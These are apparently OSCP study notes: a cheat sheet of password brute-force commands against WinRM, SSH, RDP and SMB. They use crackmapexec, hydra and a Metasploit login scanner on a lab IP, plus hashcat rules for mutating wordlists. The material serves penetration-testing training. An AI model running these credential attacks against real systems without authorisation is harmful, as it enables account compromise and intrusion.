# Network Services

## Windows

### WinRM

**CrackMapExec**

```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

eg.

```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

### SSH

**Hydra - SSH**

```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

### Remote Desktop Protocol (RDP)

**Hydra - RDP**

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```

### SMB

**Hydra - SMB**

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```

> using hydra in some cases we might get an&#x20;
>
> ```shell-session
> [ERROR] invalid reply from target smb://10.129.42.197:445/
> ```
>
> error. We can solve this by updating our `hydra` or use another tool for this purpose.

<mark style="color:red;">**Metasploit Framework (Allowed only once in OSCP so use it wisely)**</mark>

```shell-session
msf6 > use auxiliary/scanner/smb/smb_login
```

> After cracking successfully we can access the SMB share via `CrackMapExec` or `smbclient`.

### Mutating passwords

```shell-session
 hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```







